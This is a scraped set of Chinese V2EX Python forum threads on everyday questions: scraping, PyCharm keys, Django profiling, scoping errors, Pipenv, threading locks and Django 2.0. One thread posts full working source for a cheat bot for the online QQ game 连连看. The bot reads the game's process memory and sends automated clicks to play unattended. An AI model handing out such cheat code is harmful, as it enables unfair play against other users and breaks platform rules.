{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如说我在某网站的输入框填写特定内容，提交之后会有 Yes 和 No 两种返回信息。我希望获取这个返回 alert 的提示内容，如果是 Yes 就把输入的内容保存下来，如果是 No 就放弃掉输入的内容。这个需求用 Python 能实现么？</p>\n</div></div>"], "reply": "10", "tittle": "如何获取网页表单提交后的返回信息(alert)？", "comment": ["F12 抓请求用 requests 模拟请求，或者用 PhantomJS 模拟浏览器。", "应该是个异步", "写正则处理 js 。", "楼主，你需要的可能是:\r", "js.comform()", "1.ajax 请求， post 表单内容到接口，解析返回内容。\r", "2.跳转页面提交的表单，写正则捕获内容。\r", "3.Jsonp, 用 webdriver 模拟浏览器，读提交完成后的内容。", "我理解你的需求是： python 提交 form ，返回的网页会 alert ，你需要得到 alert 的内容。解决方法：查找网页的 alert 内容在哪个位置， HTML/JS/等等，然后抓出来。 python 可以实现。", "我感觉大家把楼主的问题想复杂了，楼主应该压根不知道什么叫 urllib2, requests, re 这几个 python 库", " 你说的对，我只了解过一点儿 urllib2 ，抓个天气预报的信息啥的。", " 我找到了网页源码用 ajax 抓，它提示这个 asp 文件是外部的文件，对于那个网站来说是内部文件，对我这个从外部抓取的就成外部文件了，之后就没有下文了。", " 好的，我试试，感谢你"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>默认的快捷键是 shift + F10 ，我感觉十分不方便，大家都设置成什么键？</p>\n</div></div>"], "reply": "5", "tittle": "大家使用 pycharm 来写 Python ，运行有自定义一个快捷键吗？", "comment": ["直接 F10", "不是有很多种 keymap 吗", " \r", " \r", "\r", "目前正在学习 python ，需要经常运行代码，所以觉得用鼠标或者按 shift+F10 这样的组合键太麻烦，影响操作的连续性。我更改了默认的 keymap ，首先在 keymap 中 找到原来 F10 所指向的功能，把其删掉，然后再把 run 的新快捷键指定为 F10", "F5 ， ctrl+b.", " 默认情况下 F10 没分配功能吧 ", " "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>初中时候写过一个 MFC 的，最近翻代码找到了,倍感怀念，于是写了个 Python 版的，大牛别喷</p>\n<p>使用方法：打开 QQ 游戏连连看，找到个房间，比如高手区\n然后打开脚本就可挂机了</p>\n<p>代码：</p>\n<pre><code>#!/usr/bin/env python\n# coding:utf-8\n\"\"\"\n作者:sleshep\n邮箱:x@icexz.com\n日期:16-9-19\n时间:上午 11:50\n\"\"\"\nimport struct\nimport time\nfrom ctypes import *\nfrom logging import basicConfig, getLogger, DEBUG\n\nbasicConfig()\nlog = getLogger(__name__)\nlog.setLevel(DEBUG)\nuser32 = WinDLL('user32.dll')\nkernel32 = WinDLL('kernel32.dll')\n\nWM_LBUTTONDOWN = 0x201\nWM_LBUTTONUP = 0x202\n\n\ndef read_chess_memory():\n    hwnd = get_llk_hwnd()\n    chess = create_string_buffer(11 * 19)\n\n    if hwnd:\n        pid = c_int()\n        user32.GetWindowThreadProcessId(hwnd, byref(pid))\n        h_process = kernel32.OpenProcess(0xf0000 | 0x100000 | 0xfff, 0, pid)\n        kernel32.ReadProcessMemory(h_process, 0x129fb4, byref(chess), 11 * 19, byref(pid))\n        kernel32.CloseHandle(h_process)\n    return chess\n\n\ndef get_llk_hwnd():\n    hwnd = user32.FindWindowA('#32770'.encode('ascii'), 'QQ 游戏 - 连连看角色版'.encode('gb2312'))\n    if not hwnd:\n        log.info('找不到游戏了.')\n    return hwnd\n\n\ndef make_long(x, y):\n    return c_long((x &lt;&lt; 16) + y)\n\n\ndef click_both(x, y, xx, yy):\n    # print('a({},{}) b({},{})'.format(x, y, xx, yy))\n    hwnd = get_llk_hwnd()\n    if hwnd:\n        first_x = 28\n        first_y = 199\n        user32.SendMessageA(hwnd, WM_LBUTTONDOWN, 0, make_long(first_y + y * 35, first_x + x * 31))\n        user32.SendMessageA(hwnd, WM_LBUTTONUP, 0, make_long(first_y + y * 35, first_x + x * 31))\n        user32.SendMessageA(hwnd, WM_LBUTTONDOWN, 0, make_long(first_y + yy * 35, first_x + xx * 31))\n        user32.SendMessageA(hwnd, WM_LBUTTONUP, 0, make_long(first_y + yy * 35, first_x + xx * 31))\n\n\ndef clear_all():\n    chess = read_chess_memory()\n    for x in range(19):\n        for y in range(11):\n            for xx in range(19):\n                for yy in range(11):\n                    if chess.raw[19 * y + x] != 0 and chess.raw[19 * yy + xx] != 0 and (xx != x or yy != y) and \\\n                                    chess.raw[19 * y + x] == chess.raw[19 * yy + xx]:\n                        click_both(x, y, xx, yy)\n\n\ndef get_chess_count():\n    return len(list(filter(int, read_chess_memory().raw)))\n\n\ndef send_redeploy():\n    hwnd = get_llk_hwnd()\n    if hwnd:\n        log.info('检测到无解,重列！')\n        y = 197\n        x = 652\n        user32.SendMessageA(hwnd, WM_LBUTTONDOWN, 0, make_long(y, x))\n        user32.SendMessageA(hwnd, WM_LBUTTONUP, 0, make_long(y, x))\n        time.sleep(2)\n\n\ndef fully_clear():\n    while get_chess_count():\n        last_count = get_chess_count()\n        clear_all()\n        if last_count == get_chess_count() and last_count != 0:\n            send_redeploy()\n\n\ndef start_game():\n    hwnd = get_llk_hwnd()\n    if hwnd:\n        y = 570\n        x = 668\n        user32.SendMessageA(hwnd, WM_LBUTTONDOWN, 0, make_long(y, x))\n        user32.SendMessageA(hwnd, WM_LBUTTONUP, 0, make_long(y, x))\n\n\ndef quick_start():\n    \"\"\"\n    大厅快速开始没法 SendMessage ，所以只能移动鼠标然后再点\n    \"\"\"\n    hwnd = user32.FindWindowA(0, '连连看'.encode('gb2312'))\n    if hwnd:\n        rect = create_string_buffer(16)\n        user32.GetWindowRect(hwnd, byref(rect))\n        left_x, left_y, *_ = struct.unpack('&lt;IIII', rect.raw)\n        x = 275 + left_x\n        y = 150 + left_y\n        user32.SetCursorPos(x, y)\n        time.sleep(.5)\n        user32.mouse_event(0x0002, x, y, 0, 0)\n        time.sleep(.5)\n        user32.mouse_event(0x0004, x, y, 0, 0)\n        time.sleep(3)\n\n\ndef main():\n    while 1:\n        if not get_llk_hwnd():\n            log.info('没找到游戏，估计被踢出来了，现在重新进..')\n            quick_start()\n        start_game()\n        time.sleep(1)\n        fully_clear()\n\n\nif __name__ == '__main__':\n    main()\n</code></pre>\n</div></div>"], "reply": "15", "tittle": "QQ 连连看外挂 Python 版本.", "comment": ["windows xp + python3.4 成功，只能运行于 python3+\r", "windows7 以上有 ASLR 基地址可能会有问题，没试验", "现在写的不是应该 win10 + python3 么", " \r", "虚拟机里只装了 xp\r", "母鸡 ubuntu", "能不能写个文章，分析下这个脚本，大神", "一些 win api 的调用， py 不适合干这个", "连连看，当初开外挂撩妹子装高手", "py3 对中文支持正好\r", "#coding:utf8\r", "'#32770'.encode('ascii'), 'QQ 游戏 - 连连看角色版'.encode('gb2312')", "import * 这个习惯不太好~", " ctypes 一般还真都这么用", " \r", "一看你就是没咋写过", " 说说为什么不好", " 命名空间被导入了，有可能出现冲突。", " 不过有些库无所谓。。。", " 哈， ctypes 还真用的少..", "咦，我一个非程序猿都看懂了不少行，和按键精灵的代码很像。"]},
{"content": ["<div class=\"topic_content\">现在有一个基于 django 的 url 的响应时间在 4-5s(后端),我想知道问题出在哪个函数,或哪个代码段?\r<br>最笨的办法就是打 log.\r<br>\r<br>年前正好有一点时间,不知道成熟的业界方案是?请各位 juju 指点一二.\r<br>\r<br>django debug toolbar 只能提供 sql 级别的.\r<br>\r<br>但是我这边遇到的问题和 sql 关系不大,主要还是 python 的性能引起的,(因为有大量的计算在里面).\r<br>\r<br>谢谢大家.</div>"], "reply": "2", "tittle": "求助,<django/ Python >的<性能分析/性能测试><最佳实践>?", "comment": [" 是不是这个？", "基本上是找个 apm 解决问题\r", "国内 oneapm ， python 端 原来代码直接抄 new relic 的，加密都不加密 变量都不换，不知道现在咋么样。\r", "国外  new relic 。\r", "不过上面都要点钱\r", "\r", "所以推荐 \r", "opbeat , 存一天不要钱 ，对 django 原声支持，你看下官网就知道了。\r", "\r", "// django debug toolbar 提供函数级别的监控 ，手动在 pannel 那里 加 Profiling pannel 就好了，精准到代码每行的性能"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，现在只考虑一种情况, 其他情况以此类推：</p>\n<pre><code>a = 1\ndef func1():\n   print(a)\n   return a\n    \ndef func2():\n   print(a)\n   a = a + 1\n   return a\n</code></pre>\n<p>这两个函数只有 func1 可以正常执行， func2 会抛出 UnboundLocalError 异常。前者比较好解释，局部作用域没有 a ，那么会从全局作用域中去查找这个 a 。</p>\n<p>后者我只能这样解释，就是函数体在执行前会做预先检查。如果发现有赋值语句存在，就会认为该变量名处于局部作用域中。由于函数体中有 a = a + 1 ，所以函数只在局部作用域查找 a ， 然后执行的时候，发现并没有 a 这个变量，故抛出异常。</p>\n<p>我觉得这种解释非常的绕，而且不是很直观，很容易忘记。不知道各位 v 友有什么通俗一点的方式来描述这种行为~</p>\n</div></div>"], "reply": "10", "tittle": "怎样更好的解释 Python 中的 UnboundLocalError?", "comment": ["global a", " ......晕，这个解释不了这个问题。", "因为赋值语句的存在, Python 尝试在局部作用域 (即 locals 名字空间) 中新建一个对象关联. 其实只是局部变量跟全局变量变量名冲突了. 冲突之后 Python 因为按 LEGB 顺序查找变量, 发现 a 还没有在局部作用域绑定, 所以导致了 UnboundLocalError.\r", "```\r", "def test1():\r", "    a = a\r", "    print(a)\r", "\r", "def test2():\r", "    x = a\r", "    print(x)\r", "```\r", "第一个没问题, 第二个报错.", "简单来说就是:\r", "赋值导致了拥有这个变量名的变量只能在局部作用域查找", "加个 a = a 还报错吗", " \r", " \r", "说反了, 第一个报错, 第二个没问题..........", " 符合逻辑", "以前写 c 程序的时候，偶尔也会有出乎意料的结果，但是我一直有个办法，就是反汇编直接跟踪执行流程。\r", "\r", "python 也一样， import dis, dis.dis(func1), dis.dis(func2), 瞬间就明了了。", "func2() 里面加一个 global a 就不会抱错了，因为这样是为了让你在修改变量的时候提醒你，你有个全局变量和你要修改的变量名称相同。\r", "（ python 3.5.2)\r", "a = 1\r", "def func1():\r", "   print(a)\r", "   return a\r", "\r", "print(func1())\r", "\r", "def func2():\r", "    global a\r", "    a += 1\r", "    print(a)\r", "    return a\r", "\r", "print(func3())\r", "\r", "这种情况下是不会报错的，如果仅仅是引用全局变量而不修改全局变量是不会报错的"]},
{"content": ["<div class=\"topic_content\">终于等来了这个工具，不用羡慕 node 里的 Yarn 了，也不必嫌 Pyenv 的单薄了。这个东西不用多介绍了，想必大家都懂的。\r<br><a target=\"_blank\" href=\"https://github.com/kennethreitz/pipenv\" rel=\"nofollow\">https://github.com/kennethreitz/pipenv</a></div>"], "reply": "21", "tittle": "Pipenv: Yarn + Pyenv 的组合， requests 作者的新作", "comment": ["真大神", "因为一直在关注他，也看到了这个项目，其实不是很明白特意写一个包的好处，楼主能帮忙介绍下嘛 0- 0 ？", "这哥们的代码写的真漂亮，值得每一个 Python 开发者学习啊。", " 我觉得主要是那个 Pipfile.lock 文件，保留了你开发环境下面所有的 package 的版本 ", "好东西，可以少敲好多代码", "大神有个 organization 叫 the white house ", " ", " requirements.txt 也可以指定版本啊 0- 0 ，有别的嘛？", "虽然只是把 virtualenv 和 pip 的命令合二为一了。。。\r", "\r", "但是想想真的会很好用啊", " lock 精确保留每个库的版本，不更新依赖版本就不会变，避免各种不兼容问题。", " 很多包管理现在的做法是，在指定需要什么包的时候不用指定版本，第一次安装的时候进行依赖解析并生成 .lock 文件保存准确版本，这样在其他环境下安装的时候会直接到 .lock 文件里面找到每个包的准确版本来安装，同时不会给开发人员带来版本管理的负担", "平时使用 conda 做虚拟环境，不知道这位大神的工具和 conda 的区别和优势在哪里？目前用 conda 还没有觉得有蹩脚的地方。", " 哦哦这样子，谢谢科普~", " 嗯嗯，谢谢科普", "敢不敢好好靠脸吃饭啊 =。=", "Python 也需要一个这样的东西了。 bundle, cargo 类似", "初略看了下，虽然名字都有 env ，可是这个库和 pyenv 是没有一毛钱关系的，也没有整合", "另外 pyenv+virtualenv 的组合基本没有太大毛病。 pipfile 文件解决在 dev 和 prod 多个环境中安装包略有不同，并没有很惊艳的效果，总结来说现在已有的方案能解决问题。这个库只是想让做的方法更好一点点而已", " 应该是目前还不完善， pipenv --two/three 这个参数目前不起作用，可能也是我的使用方法不对。", " 插件管理有两个作用，一个是说明需要装的插件，一个是解决依赖并锁定插件版本。\r", "传统上的 requirements.txt 兼具了这两个作用。但是有一个问题，依赖关系和版本锁定非常复杂，手写的话不仅非常麻烦，而且很容易出错。所以有 pip freeze 功能。但是 pip freeze 功能又有一个问题，就是他把系统上所有安装的包都给 freeze 下来了：有些是你其他 project  的包，有些是你临时装了 debug 用的、或者是一些命令行小工具，你不想放进 repository 的。\r", "\r", "Virtualenv 是一个解决方法。至少其他 project  的包不会进来了。但是这样的话，不同 project 需要安装好几次一样的包，浪费空间。另外，临时的 debug 工具这种情况，还是会被 freeze 下来。\r", "\r", "\r", "以 Ruby 的 Bundler 为代表，把“说明需要装的插件”功能和“解决依赖并锁定插件版本”功能分开了。分为 Gemfile 和 Gemfile.lock. 前者格式非常简单，并且可以方便的指定人为限定的附加信息如：我需要 Rails 这个包，> 4.0  版本。这个文件手动编辑。另一个 lock 文件，是自动生成的，比如精确到 Rails 4.2.1 版本。在第一次 bundle install 时，系统把能够满足依赖关系的精确版本记录在 lock 文件里，其他开发者使用、部署的时候就会用完全一模一样的版本，避免莫名其妙的问题。\r", "\r", "同时，同一台机器上即使有多个 project ，也不需要把同一个包装好几遍了。 Ruby 的 bundler 在使用时，可以在系统内多个版本的同一个包中，只读取 lock 文件制定的精确版本。甚至可以 Bundle.require 一次性 load 所有包。", " 谢谢科普，终于有点明白优势在哪里了，谢谢谢谢", "膜拜大神的 Github, 顺便看看他写的 Python guide, 大神!"]},
{"content": ["<div class=\"topic_content\">完全没有头绪是怎么回事，谷歌也没查到什么。。。。。。\r<br>\r<br>代码如下：\r<br>from twilio.rest import TwilioRestClient\r<br>\r<br>account_sid = \"AC1051ad791e2819985cbf04e********\"\r<br>auth_token = \"76f04e0a842f4a1b77162345a*******\"\r<br>client = TwilioRestClient(account_sid, auth_token)\r<br>\r<br>message = client.messages.create(\r<br>    body=\"Hello there!\",\r<br>    from_=\"+1414622****\",\r<br>    to=\"+861860963****\")\r<br>\r<br>print message.sid\r<br>\r<br>\r<br>报错:\r<br>Traceback (most recent call last):\r<br>  File \"C:\\Users\\sunwe\\Desktop\\WorkPlace of Python\\Lesson03\\send_text.py\", line 3, in &lt;module&gt;\r<br>    import twilio\r<br>  File \"C:/Users/sunwe/Desktop/WorkPlace of Python/Lesson03\\twilio.py\", line 3, in &lt;module&gt;\r<br>AttributeError: 'module' object has no attribute '__version__'</div>"], "reply": "2", "tittle": "使用 twilio 一直报错，求大牛们看下哪里出错了", "comment": ["你知道为什么没有人回答你吗?\r", "\r", "因为 Google 一下就能得出答案", " 我就是没谷歌到才发帖，有什么问题？"]},
{"content": ["<div class=\"topic_content\">写个播放器，用什么后端比较好？\r<br>\r<br>libVLC\r<br>MPlayer -slave\r<br>GStreamer\r<br>FFmpeg+SDL\r<br>Phonon\r<br>QtMultimedia</div>"], "reply": "1", "tittle": "写个播放器，用什么后端比较好？", "comment": ["能解决需求->性能->可维护性"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Q ： Why does Python print the formula or the functions \"backward\"?<br>\nA ： It's not really backward, it's \"inside out.\" When you start breaking down the function into separate formulas and function calls you'll see how it works. Try to understand what I mean by \"<strong>inside out</strong>\" rather than \"<strong>backward</strong>.\"<br>\nfrom ： <a href=\"https://learnpythonthehardway.org/book/ex21.html\" rel=\"nofollow\">https://learnpythonthehardway.org/book/ex21.html</a><br></p>\n</div></div>"], "reply": "2", "tittle": "请问这里的 backward 和 inside out 是想表达什么？谢谢", "comment": ["-- 为什么输出的文本是按（与函数名出现的顺序）相反的顺序打印出来的？\r", "-- 准确来说并不是反序，而是（按照函数的调用层次）从里向外的顺序\r", "\r", "比如 31 行， what = add(age, subtract(height, multiply(weight, divide(iq, 2))))，函数出现的顺序（正序）是 add - sub - mult - divide ，而在实际执行代码时， python 先确定参数的值，然后才调用函数，这就导致了在最内层的 divide 会最先调用，所以就成了 inside-out", " 谢谢，理解了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>突然就跪了，不知道为什么</p>\n<p>代码：</p>\n<pre><code>import urllib2\nurllib2.urlopen('http://www.baidu.com')\n</code></pre>\n<p>output:</p>\n<pre><code>Traceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py\", line 154, in urlopen\n    return opener.open(url, data, timeout)\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py\", line 431, in open\n    response = self._open(req, data)\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py\", line 449, in _open\n    '_open', req)\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py\", line 409, in _call_chain\n    result = func(*args)\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py\", line 1240, in https_open\n    context=self._context)\n  File \"/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py\", line 1197, in do_open\n    raise URLError(err)\nurllib2.URLError: &lt;urlopen error [Errno 61] Connection refused&gt;\n&gt;&gt;&gt;\n</code></pre>\n<p>然后用 python3 一样的结果，但是终端里面是可以 ping 通的，并且终端里面其他的软件比如 curl 也是可以使用的，偏偏 python 跪了，不知道为什么</p>\n<p>pip 也不能装package了，一样不能联网，拒绝连接。。。。。</p>\n</div></div>"], "reply": "9", "tittle": "诡异的问题（ Python /python3） urlopen 连接拒绝，跪了", "comment": ["n 你需要抓包", " 终端设置代理用 charles 抓包发现能正常连接。。。。，然后之后就一切正常了，好无力", "写代码的时候发现， requests 适用的情况比 urllib.request 广", " 是的， requests 写起来更简单", " 可能正好你用 python 的时候网络有问题。这里这么安静应该不是药厂的问题。另外 ping 好使不代表 tcp 80 好使。。", "通常情况下， urlopen 要用 try 包起来的，然后 sleep 几秒再试，试三回不成功写入日志，多开几个线程同时干其它的。\r", "因为经常有网络异常的情况，或者被服务器给当爬虫拒绝了。", "改 UA 试试", " \r", " \r", "\r", "很诡异，我请求的本地服务也不行，突然间只有 python 不能联网，其他都是好好的", "被防火墙之类干掉了？"]},
{"content": "", "reply": "22", "tittle": "关于博客中草稿箱的实现：页面表单通过 ajax 提交数据到后台服务器，多次保存，后台怎样识别是同一篇文章的草稿？如果不能识别的话岂不是每次保存都会创建新的草稿？", "comment": ["你文章没 ID 的？", "简单点的做法是，第一次草稿保存之后，调到编辑页面。\r", "稍微复杂一点点的做法是。第一次保存之后，记下 id ，然后再次保存的时候带上这个 id 。好处是不用跳转到编辑页面了", "wordpress 确实是每次都会创建一个新的草稿", "对正文算下 md5 ？", "草稿也有 id 啊， Ajax 返回草稿 id ，下次保存就用这个 id 。", "用 UUID 的话都不需要等 Ajax 返回 ID\r", "直接生成一个反正撞不上", "wordpress 的自动保存相当于每次创建新的文章,只不过状态标记为草稿,并且指向第一个文章的 ID. 这样第一篇文章就可以随时找到所有草稿,草稿因为有状态标记也可以随时选择清理.", "当用户点新建文章的时候，后台已经有了一个无内容，未发布的文章了。然后 302 到这篇文章的编辑页面。", " 这个解决方案很棒，在请求编辑页面的时候生成文章对象，谢啦", " 嗯嗯，谢谢", "其实可以用浏览器的 localstorage 实现", "wp 都没用过吗？问这样的问题", "“草稿”只是文章的一个状态\r", "第一次保存就可以取得 ID ，可以在后续编辑中使用\r", "前端只显示状态切换到“发布”的文章即可", " 如果用户不保存呢？日积月累这些垃圾信息咋删除？\r", "如果自动删除，那如果用户只是想保存个草稿呢，怎么区分用户想要的草稿和废弃的草稿？", "草稿也可以编 id\r", "基本上你草稿的 id 和文章的 id 是独立的。", " 嗯嗯，谢谢", "不是应该客户端伐 localStorage ？", " 没用过咋了。\r", "wp 又不是必需品。", " 参考 Gmail 发件箱的做法咯。", " 是让你参考做法…… zz", " 怎么个做法？", "补充： sessionstorage 也不错"]},
{"content": ["<div class=\"topic_content\">scrapy 运行日志\r<br>**************ProxyMiddleware not pass************171.38.66.23:9999\r<br>2017-01-26 23:05:38 [selenium.webdriver.remote.remote_connection] DEBUG: POST <a target=\"_blank\" href=\"http://127.0.0.1:57234/wd/hub/session\" rel=\"nofollow\">http://127.0.0.1:57234/wd/hub/session</a> {\"desiredCapabilities\": {\"browserName\": \"phantomjs\", \"version\": \"\", \"platform\": \"ANY\", \"javascriptEnabled\": true}, \"requiredCapabilities\": {}}\r<br>2017-01-26 23:05:38 [selenium.webdriver.remote.remote_connection] DEBUG: Finished Request\r<br>2017-01-26 23:05:38 [selenium.webdriver.remote.remote_connection] DEBUG: POST <a target=\"_blank\" href=\"http://127.0.0.1:57234/wd/hub/session/e5c0aeb0-e3d8-11e6-a629-15e39efe8c5a/url\" rel=\"nofollow\">http://127.0.0.1:57234/wd/hub/session/e5c0aeb0-e3d8-11e6-a629-15e39efe8c5a/url</a> {\"url\": \"Matweb Engineering Materials List\", \"sessionId\": \"e5c0aeb0-e3d8-11e6-a629-15e39efe8c5a\"}\r<br>\r<br>phantonjs 中间件代码：\r<br>def process_request(self, request, spider):\r<br>        driver = webdriver.PhantomJS(executable_path=r\"/Users/apple/phantomjs-2.1.1-macosx/bin/phantomjs\")\r<br>        driver.get(request.url)\r<br>        body = driver.page_source\r<br>        print (\"访问\"+request.url)\r<br>        return HtmlResponse(driver.current_url, body=body, encoding='utf-8', request=request)\r<br>\r<br>\r<br>每次执行到 selenium.webdriver.remote.remote_connection 。 都会卡上 20s ， 请问这是为什么？</div>"], "reply": "目前尚无回", "tittle": "Scrapy+phantonjs 爬去速度过慢？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看了一下 Flask-Cache 的文档，比如：</p>\n<pre><code>from flask import Flask\nfrom flask.ext.cache import Cache\n\napp = Flask(__name__)\n# Check Configuring Flask-Cache section for more details \ncache = Cache(app,config={'CACHE_TYPE': 'simple'})\n\ncache = Cache(config={'CACHE_TYPE': 'simple'})\n# cache = Cache(app, config={'CACHE_TYPE': 'redis'})\n\napp = Flask(__name__)\ncache.init_app(app)\n</code></pre>\n<p>然后缓存视图函数：</p>\n<pre><code>@cache.cached(timeout=50)\ndef index():\n    return render_template('index.html')\n</code></pre>\n<h1>两个疑问：</h1>\n<p>1 、如果这个视图函数 index()是动态的内容，比如是用户的 Newsfeed 聚合页，这个 cache 是缓存每一个用户的 index 内容吗？</p>\n<p>2 、文档里简单提到，在 config 里（ Werkzeug 0.7 以上版本即可），可以把 CACHE_TYPE 的 simple 改用 redis 来代替，这个 redis 的缓存数据，可以通过 SQLAlchemy 从 MySQL 加载部分需要缓存的数据吗？</p>\n<p>原链接：<br>\n<a href=\"http://www.pythondoc.com/flask-cache/index.html#flask.ext.cache.Cache.memoize\" rel=\"nofollow\">http://www.pythondoc.com/flask-cache/index.html#flask.ext.cache.Cache.memoize</a><br>\n<a href=\"http://stackoverflow.com/questions/24589123/how-to-cache-sql-alchemy-calls-with-flask-cache-and-redis\" rel=\"nofollow\">http://stackoverflow.com/questions/24589123/how-to-cache-sql-alchemy-calls-with-flask-cache-and-redis</a></p>\n</div></div>"], "reply": "4", "tittle": "Python Web： Flask-Cache 怎么缓存动态内容呢？", "comment": ["我记得这个只能缓存静态页，不知道是不是记错了，建议自己写一个缓存封装，", "1 、动态的内容也可以缓存，但是如果有更新的话，在缓存过期之前，是不会加载更新的内容。\r", "2 、 redis 是 nosql 数据库，不能直接从 MySQL 直接加载数据，需要程序转换。", "聪 mysql 加载就不是缓存了，最好还是不要缓存视图", "不同的用户用不同的 key"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>做一个伸手党。\n我写了一个程序检测日志文件变化，如果日志文件新增，我启动一个线程按行读取数据后将内容解析放入数据库，记录行号到.ini 配置文件里面（大约需要 5-10 秒）。由于写入日志程序有时 5 秒内写入多次，导致上个线程还没有执行完，就又启动了一个线程。。。。。。，每个进程执行完写入记录行号时候偶尔会冲突，导致 ini 配置文件最后变为空白 0kb 大小。我想让第一个线程启动之后，再启动的线程等待第一个线程结束后再执行。\n我代码部分内容如下：</p>\n<pre><code>     t2=threading.Thread(target=runReadLogFile,args=(1,))\n    t2.start()#程序启动后先执行一次读取日志文件。\n    当检测到日志文件修改后执行:\n    t1=threading.Thread(target=runReadLogFile,args=(1,))\n    t1.start()\n</code></pre>\n</div></div>"], "reply": "20", "tittle": "threading 线程间通信如何控制线程运行及等待。", "comment": ["直接等线程结束再启动新线程，或者就保持一个线程，定时唤醒", "you need a lock", "  你意思是不是 我在主线程里面定义 线程 1 ，日志文件被修改的时候我启动线程 1\r", "\r", "     t2=threading.Thread(target=runReadLogFile,args=(1,))\r", "    t2.start()#程序启动后先执行一次读取日志文件。\r", "    t1=threading.Thread(target=runReadLogFile,args=(1,))#预先设置线程一，等待启动\r", "\r", "    当检测到日志文件修改后执行:\r", "        t1.start()#如果 t1 没执行完，再次调用会报错还是继续执行？", "锁", "弱弱问下大家：\r", "* lz 的这种收集日志到 db 的思路，是否 ok ？\r", "* 为什么不用 logstash ？", " 在 runReadLogFile 里去读 log ，处理完后 sleep 一段时间，再尝试去读", " 最开始是这样操作的。\r", "一个线程循环读文件\r", "但是到了后期文件大了,加入了日志文件修改检测后处理\r", "这样后期文件大了。不用平凡读取日志文件。", "资源访问的临界区请用锁控制", "或者单写多读，可以去掉锁", "锁，信号量，都行。但个人感觉不是很合理。不说你这个方案本身(也许这是你当前场景的最佳选择)，就说如果这个线程必须等上个线程完成后再开始任务，为什么不就开一个线程，循环从队列里面取。", "multiprocessing.Manager()\r", "manager.Lock()", " 文件大了又怎么样？ open 后， seek 到对应位置直接读固定长度的内容，不会有性能问题的！\r", "   另外，不管多少个线程，互斥操作同一个资源都是要顺序执行的，没法并行，所以根本提升不了速度", " 我读取日志文件是一次全部读取,计算行数。如果行数大于 ini 文件的记录值,就按行便利一遍,从记录行开始处理数据(这个操作时间长),日志单行长度不固定,如果从 seek 开始读取固定长度担心出现截取不全。想建立一个队列,里面只有一条,空就加入任务队列,满了就 try 一下捕获异常。\r", "但是不知道 treading 如何取队列并执行", " 那为什么不直接记录当前读取位置呢？这样下次就可以直接 seek", "加锁吧，没有其它办法", "还有一个简单的办法 申请线程池 然后只有一个线程\r", "这样可以提交任务到阻塞队列", "用信号量呗", "发现还是自己不会使用类。还在学习中。\r", "现在用 queue (1)。\r", "但是发现日志文件如果是第二天的时候没法从头读取。晚上在学习下", "这个需求为什么用线程？\r", "多线程访问数据库又不会快\r", "循环就行\r", "\r", "“再启动的线程等待第一个线程结束后再执行”这样是不对的\r", "考虑万一你运气不好，一连串的都慢了，就会有一堆在等，然后这个队就没有头了\r", "\r", "加锁，但是不阻塞，拿不到锁就退出，等别人做。", " 感觉我可能程序写的有点问题！把读取文件加锁后，如果上一程序在读完日志，开始处理数据插入工作，在有日志增加，检测到锁就退出会导致有数据无法读取到。处理数据这块不好加快速度，得读取具体指值，然后通过多次查询数据库信息比对转换后插入多个表"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://www.reddit.com/r/Python/comments/5otufg/django_20_now_on_master_will_not_support_python_2/\" rel=\"nofollow\">https://www.reddit.com/r/Python/comments/5otufg/django_20_now_on_master_will_not_support_python_2/</a></p>\n<p>Reddit 上一片喜大普奔。就我个人而言最希望 Django 在放弃 Python 2 的支持后能把 type hints 加上。</p>\n</div></div>"], "reply": "32", "tittle": "Django 2.0 将放弃 Python 2 的支持", "comment": ["姿瓷", "喜大普奔，终于不用费尽心思 decode/encode 了", "喜大普奔", "虽然一直用 python2.7 ，但还是支持！", "然而终于可以抛弃 py2le", "天灭 python2 ", " ", "。。。。。一直 python2 ， 3 暂时不适应", "滋瓷 Type Hint", "强烈支持啊。\r", "Django 源码里大量兼容 2 的内容，完全不需要", "  表示自从用了 PY3 之后 . 表示 decode/encode 多了好多 .  - - |||", "放弃支持，不代表不能用，再说还有其他框架还呢。", " +1", "。。。。。。。。。哈？", "天灭 python2", "主要还是坐等 pypy 能尽快支持 python3(现在的 pypy3 依然是玩具级别），要不然很多情况下为了运行速度还是不得不兼容 python2", "天灭 python2 , 喜大普奔", "可以可以，已经用 py3 好久了", "干", "天灭 py2", "可以放弃 django 2 啦，哈哈哈哈", " 之前 Mozilla 给 pypy 捐了不少钱来搞 Python 3.5 的支持 ", "喜大普奔，然而我司还在用 Django 1.4 ，哈哈哈。", " 但是进展依然不乐观", " 别坐等啊，去捐款", "这个很久很久以前就出现在 road map 上了啊", "然而公司依然 python 2.6", "喜大普奔", "喜大普奔", "支持", "我们还停在 Python2.6+Django1.6 ，现在想想 重构需要花费的时间真的不多", "我司一上来就是 python3.5  + django1.10 哈哈哈 \r", "django2.0 支持 python3 的携程吗？", "想七年前我学 python 的时候，大家都已经在说 python 3 万岁， python 2.X 拜拜。\r", "一晃这么多年过去了，还有很多人在 2.7 的坑里。"]},
